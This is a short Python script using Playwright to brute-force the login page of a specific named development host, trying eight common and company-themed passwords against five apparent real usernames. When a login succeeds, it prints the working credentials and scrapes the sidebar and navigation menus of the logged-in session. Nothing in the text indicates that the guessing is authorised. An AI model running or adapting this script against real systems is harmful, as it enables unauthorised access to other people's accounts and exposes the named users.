import time
from playwright.sync_api import sync_playwright

passwords = ['123456', 'Abc@123', '123456aA@', 'Admin@123', 'admin', '12345678', 'vlncn@123', 'Evotek@123']
users = ['thang.pmjin', 'duyanh1', 'ngocanhvu', 'thukhoban', 'thonom']

def test_passwords():
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        page = browser.new_page(viewport={'width': 1920, 'height': 1080})

        for u in users:
            for pwd in passwords:
                page.goto('http://dev-qn-mm.evotek.vn/login')
                page.wait_for_selector('input')
                inputs = page.query_selector_all('input')
                inputs[0].fill(u)
                inputs[1].fill(pwd)
                page.click('button:has-text("Đăng nhập")')
                time.sleep(1)
                if '/login' not in page.url:
                    print(f"SUCCESS! User: {u}, Password: {pwd}, URL: {page.url}")
                    # Save menus
                    menus = page.query_selector_all('aside a, .sidebar a, nav a, .ant-menu-item, li[role="menuitem"]')
                    dn_menus = [m.inner_text().strip() for m in menus if m.inner_text().strip()]
                    print("DN menus:", dn_menus)
                    browser.close()
                    return

        print("No match found.")
        browser.close()

if __name__ == '__main__':
    test_passwords()
